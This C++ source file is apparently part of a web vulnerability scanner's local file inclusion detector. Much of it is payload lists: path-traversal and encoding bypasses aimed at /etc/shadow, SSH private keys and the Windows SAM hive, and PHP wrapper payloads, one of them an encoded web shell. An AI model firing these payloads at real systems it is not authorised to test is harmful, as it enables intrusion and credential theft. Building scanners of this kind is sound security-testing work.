#include "lfidetector.h"
#include <QRegularExpression>

namespace {

const QStringList linuxPayloads = {
    QStringLiteral("../../../etc/passwd"),
    QStringLiteral("....//....//....//etc/passwd"),
    QStringLiteral("..%2F..%2F..%2Fetc%2Fpasswd"),
    QStringLiteral("..%252F..%252F..%252Fetc%252Fpasswd"),
    QStringLiteral("../../../etc/passwd%00"),
    QStringLiteral("../../../etc/passwd%00.jpg"),
    QStringLiteral("....//....//....//etc/passwd%00"),
    QStringLiteral("/etc/passwd"),
    QStringLiteral("file:///etc/passwd"),
    QStringLiteral("../../../etc/shadow"),
    QStringLiteral("../../../etc/hosts"),
    QStringLiteral("../../../proc/self/environ"),
    QStringLiteral("../../../proc/version"),
    QStringLiteral("../../../proc/cmdline"),
    QStringLiteral("../../../var/log/apache2/access.log"),
    QStringLiteral("../../../var/log/apache/access.log"),
    QStringLiteral("../../../var/log/httpd/access_log"),
    QStringLiteral("../../../var/log/nginx/access.log"),
    QStringLiteral("../../../var/log/auth.log"),
    QStringLiteral("../../../var/log/syslog"),
    QStringLiteral("....\\\\....\\\\....\\\\etc/passwd"),
    QStringLiteral("..././..././..././etc/passwd"),
    QStringLiteral("..;/..;/..;/etc/passwd")
};

const QStringList windowsPayloads = {
    QStringLiteral("..\\..\\..\\windows\\win.ini"),
    QStringLiteral("....\\\\....\\\\....\\\\windows\\win.ini"),
    QStringLiteral("..%5C..%5C..%5Cwindows%5Cwin.ini"),
    QStringLiteral("..%255C..%255C..%255Cwindows%255Cwin.ini"),
    QStringLiteral("..\\..\\..\\windows\\win.ini%00"),
    QStringLiteral("C:\\windows\\win.ini"),
    QStringLiteral("C:/windows/win.ini"),
    QStringLiteral("file:///C:/windows/win.ini"),
    QStringLiteral("..\\..\\..\\windows\\system32\\config\\sam"),
    QStringLiteral("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
    QStringLiteral("..\\..\\..\\boot.ini"),
    QStringLiteral("..\\..\\..\\inetpub\\logs\\logfiles"),
    QStringLiteral("..\\..\\..\\windows\\debug\\NetSetup.log"),
    QStringLiteral("..\\..\\..\\windows\\system32\\config\\AppEvent.Evt"),
    QStringLiteral("..\\..\\..\\windows\\system32\\config\\SecEvent.Evt"),
    QStringLiteral("..\\..\\..\\windows\\repair\\sam"),
    QStringLiteral("..\\..\\..\\windows\\repair\\system"),
    QStringLiteral("..\\..\\..\\windows\\repair\\software"),
    QStringLiteral("..\\..\\..\\windows\\repair\\security")
};

const QStringList phpWrapperPayloads = {
    QStringLiteral("php://filter/convert.base64-encode/resource=index.php"),
    QStringLiteral("php://filter/read=convert.base64-encode/resource=config.php"),
    QStringLiteral("php://filter/convert.base64-encode/resource=../config.php"),
    QStringLiteral("php://input"),
    QStringLiteral("php://stdin"),
    QStringLiteral("php://memory"),
    QStringLiteral("php://temp"),
    QStringLiteral("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"),
    QStringLiteral("expect://id"),
    QStringLiteral("expect://whoami"),
    QStringLiteral("phar://shell.jpg/shell.php"),
    QStringLiteral("zip://shell.jpg%23shell.php"),
    QStringLiteral("compress.zlib://file.txt"),
    QStringLiteral("compress.bzip2://file.txt"),
    QStringLiteral("glob:///*.txt")
};

const QStringList linuxInterestingFiles = {
    QStringLiteral("/etc/passwd"),
    QStringLiteral("/etc/shadow"),
    QStringLiteral("/etc/group"),
    QStringLiteral("/etc/hosts"),
    QStringLiteral("/etc/motd"),
    QStringLiteral("/etc/mysql/my.cnf"),
    QStringLiteral("/proc/version"),
    QStringLiteral("/proc/cmdline"),
    QStringLiteral("/proc/self/environ"),
    QStringLiteral("/proc/self/fd/0"),
    QStringLiteral("/proc/net/tcp"),
    QStringLiteral("/proc/mounts"),
    QStringLiteral("/root/.bash_history"),
    QStringLiteral("/root/.ssh/id_rsa"),
    QStringLiteral("/root/.ssh/authorized_keys"),
    QStringLiteral("/home/user/.bash_history"),
    QStringLiteral("/home/user/.ssh/id_rsa"),
    QStringLiteral("/var/log/auth.log"),
    QStringLiteral("/var/log/apache2/access.log"),
    QStringLiteral("/var/log/apache2/error.log"),
    QStringLiteral("/var/log/nginx/access.log"),
    QStringLiteral("/var/log/nginx/error.log"),
    QStringLiteral("/var/log/httpd/access_log"),
    QStringLiteral("/var/log/httpd/error_log"),
    QStringLiteral("/var/log/syslog"),
    QStringLiteral("/var/log/messages"),
    QStringLiteral("/var/mail/root"),
    QStringLiteral("/var/spool/cron/crontabs/root"),
    QStringLiteral("/etc/apache2/apache2.conf"),
    QStringLiteral("/etc/httpd/conf/httpd.conf"),
    QStringLiteral("/etc/nginx/nginx.conf"),
    QStringLiteral("/etc/ssh/sshd_config"),
    QStringLiteral("/etc/resolv.conf"),
    QStringLiteral("/etc/fstab")
};

const QStringList windowsInterestingFiles = {
    QStringLiteral("C:\\windows\\win.ini"),
    QStringLiteral("C:\\windows\\system.ini"),
    QStringLiteral("C:\\boot.ini"),
    QStringLiteral("C:\\windows\\system32\\config\\sam"),
    QStringLiteral("C:\\windows\\system32\\config\\system"),
    QStringLiteral("C:\\windows\\system32\\config\\software"),
    QStringLiteral("C:\\windows\\system32\\drivers\\etc\\hosts"),
    QStringLiteral("C:\\windows\\repair\\sam"),
    QStringLiteral("C:\\windows\\repair\\system"),
    QStringLiteral("C:\\windows\\repair\\software"),
    QStringLiteral("C:\\windows\\debug\\NetSetup.log"),
    QStringLiteral("C:\\windows\\system32\\config\\AppEvent.Evt"),
    QStringLiteral("C:\\windows\\system32\\config\\SecEvent.Evt"),
    QStringLiteral("C:\\windows\\system32\\config\\default.sav"),
    QStringLiteral("C:\\windows\\system32\\config\\security.sav"),
    QStringLiteral("C:\\windows\\system32\\config\\software.sav"),
    QStringLiteral("C:\\windows\\system32\\config\\system.sav"),
    QStringLiteral("C:\\windows\\system32\\inetsrv\\config\\applicationHost.config"),
    QStringLiteral("C:\\windows\\system32\\inetsrv\\config\\schema\\ASPNET_schema.xml"),
    QStringLiteral("C:\\inetpub\\wwwroot\\web.config"),
    QStringLiteral("C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log"),
    QStringLiteral("C:\\windows\\Panther\\Unattend\\Unattended.xml"),
    QStringLiteral("C:\\windows\\Panther\\Unattended.xml"),
    QStringLiteral("C:\\windows\\system32\\sysprep\\sysprep.inf"),
    QStringLiteral("C:\\windows\\system32\\sysprep\\sysprep.xml"),
    QStringLiteral("C:\\unattend.xml"),
    QStringLiteral("C:\\sysprep.inf")
};

const QStringList linuxIndicators = {
    QStringLiteral("root:x:0:0:"),
    QStringLiteral("daemon:x:1:1:"),
    QStringLiteral("bin:x:2:2:"),
    QStringLiteral("sys:x:3:3:"),
    QStringLiteral("sync:x:4:"),
    QStringLiteral("nobody:x:"),
    QStringLiteral("/bin/bash"),
    QStringLiteral("/bin/sh"),
    QStringLiteral("/usr/sbin/nologin"),
    QStringLiteral("127.0.0.1"),
    QStringLiteral("localhost"),
    QStringLiteral("Linux version"),
    QStringLiteral("BOOT_IMAGE=")
};

const QStringList windowsIndicators = {
    QStringLiteral("[fonts]"),
    QStringLiteral("[extensions]"),
    QStringLiteral("[mci extensions]"),
    QStringLiteral("[files]"),
    QStringLiteral("[Mail]"),
    QStringLiteral("MAPI=1"),
    QStringLiteral("; for 16-bit app support"),
    QStringLiteral("[boot loader]"),
    QStringLiteral("timeout="),
    QStringLiteral("default=multi"),
    QStringLiteral("[operating systems]")
};

bool containsFileContent(const QString &text, const QStringList &indicators) {
    for (const QString &indicator : indicators) {
        if (text.contains(indicator, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

} // anonymous namespace


LfiDetector::LfiType LfiDetector::detect(const QString &responseBody) const
{
    if (responseBody.isEmpty()) {
        return LfiType::None;
    }

    if (containsFileContent(responseBody, linuxIndicators) ||
        containsFileContent(responseBody, windowsIndicators)) {
        return LfiType::BasicLfi;
    }

    QRegularExpression base64Re(QStringLiteral("^[A-Za-z0-9+/]{50,}={0,2}$"),
                                QRegularExpression::MultilineOption);
    if (base64Re.match(responseBody).hasMatch()) {
        return LfiType::WrapperBased;
    }

    return LfiType::None;
}

bool LfiDetector::isVulnerable(const QString &responseBody) const
{
    return detect(responseBody) != LfiType::None;
}

QStringList LfiDetector::getPayloads(OsTarget os)
{
    switch (os) {
    case OsTarget::Linux:
        return linuxPayloads;
    case OsTarget::Windows:
        return windowsPayloads;
    default:
        QStringList all = linuxPayloads;
        all.append(windowsPayloads);
        return all;
    }
}

QStringList LfiDetector::getPhpWrapperPayloads()
{
    return phpWrapperPayloads;
}

QStringList LfiDetector::getInterestingFiles(OsTarget os)
{
    switch (os) {
    case OsTarget::Linux:
        return linuxInterestingFiles;
    case OsTarget::Windows:
        return windowsInterestingFiles;
    default:
        QStringList all = linuxInterestingFiles;
        all.append(windowsInterestingFiles);
        return all;
    }
}

int LfiDetector::severityLevel(LfiType type)
{
    switch (type) {
    case LfiType::WrapperBased:
        return 4; // Critical - can lead to RCE
    case LfiType::BasicLfi:
    case LfiType::NullByteInjection:
    case LfiType::FilterBypass:
        return 3; // High
    case LfiType::DoubleEncoding:
    case LfiType::PathTruncation:
        return 2; // Medium
    default:
        return 0;
    }
}
